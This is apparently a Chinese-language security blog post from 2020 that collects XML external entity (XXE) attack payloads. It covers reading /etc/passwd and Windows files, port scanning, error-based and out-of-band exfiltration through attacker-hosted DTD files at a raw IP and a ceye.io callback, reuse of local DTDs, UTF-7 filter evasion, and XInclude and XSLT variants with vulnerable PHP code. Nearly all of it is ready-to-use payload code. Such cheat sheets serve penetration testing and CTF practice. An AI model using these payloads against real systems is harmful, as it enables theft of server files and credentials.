---
title: 一些常见的XXE payload整理
date: April 29th 2020
tags: [Web安全, XXE, Payload, 备忘录]
summary: XML 外部实体注入（XXE）常见 payload 备忘录，涵盖文件读取、SSRF、OOB 带外数据外传等多种利用场景。
---

# 一些常见的XXE payload整理

最近遇到一些没有见过的xxe利用方式，就和之前的内容一起整理了一下。

## 常见利用

### 有回显

- 任意读取文件

```plain
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root><name>&xxe;</name></root>

```

在window中读取文件不需要使用file协议，用文件相对路径或者绝对路径即可。

- 端口扫描

```plain
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "<http://127.0.0.1:80>" >]>
<root><name>&xxe;</name></root>

```

这个用Brup去扫其实不太合适，建议使用python字写脚本。因为有些端口未开启，访问时没有回显，会一直处于请求状态。

### 无回显

- 报错型的文件读取

vps上的eval.dtd

```plain
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM '<http://aaaaaaa/?%file;>'>"
>
%all;

```

发送payload

```plain
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY  % xxe SYSTEM "<http://45.32.75.237:1234/error.dtd>" >
    %xxe;
    %send;
]>
```

- 基于OOB的数据外带

vps上的eval.dtd

```plain
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM '<http://ceye/?%file;>'>"
>
%all;

```

发送payload

```plain
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY  % xxe SYSTEM "<http://45.32.75.237:1234/eval.dtd>" >
    %xxe;
    %send;
]>

```

这两种方式的区别仅在于远程主机上的dtd文件中指定的网站host是否存在，如果不存在就报错，存在就外带。

为什么一定要使用外部dtd文件，而不是直接在一个payload里面就包含外带的实体呢？原因是外部DTD允许我们在第二个实体中包含一个实体，但是在内部DTD中是被禁止的。(也就是禁止在内部Entity中引用参数实体)

## 进阶利用

### 基于Local-dtd文件的XXE

当服务器不允许请求外网，并且存在报错时可以使用这种方式。返回的结果跟报错型是一样的。

- windows，读取本地文件：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % local_dtd SYSTEM "C:/Windows/System32/wbem/xml/cim20.dtd">
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt">
	<!ENTITY % SuperClass '>
		<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://hhhhhhhh/?&#x25;file;&#x27;>">
		&#x25;eval;
		&#x25;send;
	<!ENTITY test "test"'>
	%local_dtd;
]>
<message>111</message>
```

- Linux Ubuntu

用dtd-finder提取ubuntu里面的实体然后生成出的payload，在我的阿里云ubuntu的vps上也有这个dtd，应该是一个较为通用的dtd文件。

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/schema/xml-core/catalog.dtd">

    <!ENTITY % local.uri.attribs '>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

- Linux Centos

我只在我的腾讯云Centos的vps上发现了这个dtd文件。没有对应环境、暂且尝试这个吧，

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message></message>
```

寻找本地可利用的dtd文件：

- https://xz.aliyun.com/t/6913 (手动寻找参考例子)
- https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html
- https://github.com/GoSecure/dtd-finder (在上面的列表中不存的可以使用这个工具进行寻找)

```xml
工具使用：
docker export <image> -o iamge.tar
java -jar dtd-finder-1.0-all.jar iamge.tar
```

### 对payload进行UTF7编码

用使用这种方式可以绕过一些过滤

utf-8 ⇒ utf-7 ：[https://www.motobit.com/util/charset-codepage-conversion.asp](https://www.motobit.com/util/charset-codepage-conversion.asp)

```xml
<?xml version="1.0" encoding="utf-7"?> 
+ADwAIQ-DOCTYPE foo +AFs-
	+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AD4-
+AF0APg-
+ADw-root+AD4APA-name+AD4AJg-xxe+ADsAPA-/name+AD4APA-/root+AD4-
```

### xinclude

在不允许包含外部实体，但又存在$dom->include();时，就可以利用xinclude读取文件。

后台源码：

```php
<?php
	$xml = file_get_contents('php://input');
	$dom = new DOMDocument;
	$dom->preserveWhiteSpace = false;
	$dom->formatOutput = true;
	$dom->loadXML($xml);
	$dom->include(); // 多了这一条语句
	echo $dom->saveXML();
?>
```

利用的payload如下：

```xml

<?xml version="1.0" ?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### XSLT

XSLT：规定一个XML如何转换为其他文档。

PHP默认没有这个扩展，需要手动安装。(phpstudy中直接开启php_xsl扩展即可)

后台源码：

```php
<?php 
	$xls = file_get_contents('php://input'); // 注意这里传递进来的是xsl
	$xslDoc = new DOMDocument();
	$xslDoc->load($xls);
	$xmlDoc = new DOMDocument();
	$xmlDoc->load("test.xml");
	$proc = new XSLTProcessor();
	$proc->importStylesheet($xslDoc);
	echo $proc->transformToXML($xmlDoc);
?>
```

普通文件读取.xsl：(直接修改了root结点的内容)

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [  
<!ENTITY shit SYSTEM "php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt">   
]>  
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/root">
  &shit;
</xsl:template>
</xsl:stylesheet>
```

如果未开启外部实体可以使用报错或者OOB方式读取文件，但是我在本机搭建的环境当中，无法外带出信息，只能通过报错读取出部分，就不深究了。

报错：

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:include href="php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt"/>
</xsl:stylesheet>
```

OOB：(也会通过报错查看到)

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:variable name="name1" select="document('php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt')" />
<xsl:variable name="name2" select="concat('http://kih9lq.ceye.io/?', $name1)" />
<xsl:variable name="name3" select="document($name2)" />
</xsl:stylesheet>
```

参考这一篇：[https://www.anquanke.com/post/id/156227](https://www.anquanke.com/post/id/156227#h3-5)

CTF例子：[https://skysec.top/2018/03/23/从sql注入到xslt再到xxe的一道ctf题目/#思考攻击点](https://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9)